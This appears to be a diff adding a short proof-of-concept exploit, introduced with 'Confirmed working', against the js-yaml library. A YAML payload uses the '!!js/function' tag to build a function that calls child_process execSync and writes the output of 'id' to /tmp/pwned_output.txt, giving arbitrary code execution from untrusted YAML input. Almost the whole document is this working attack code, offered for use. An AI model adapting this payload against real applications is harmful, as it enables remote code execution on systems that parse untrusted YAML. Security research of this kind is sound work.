@@ -1,0 +1,20 @@
+Confirmed working. Here's the exploit:
+
+```javascript
+const yaml = require("./node_modules/js-yaml");
+
+// js-yaml's default schema resolves the `!!js/function` tag by calling
+// constructJavascriptFunction(), which parses attacker-controlled YAML
+// text with esprima and feeds it straight into `new Function(...)`,
+// achieving arbitrary code execution from untrusted YAML input.
+const payload = `
+exploit: !!js/function >
+  function () {
+    process.mainModule.require('child_process').execSync('id > /tmp/pwned_output.txt');
+    return 1;
+  }
+`;
+
+const doc = yaml.load(payload);
+doc.exploit(); // invokes the malicious Function created inside constructJavascriptFunction
+```
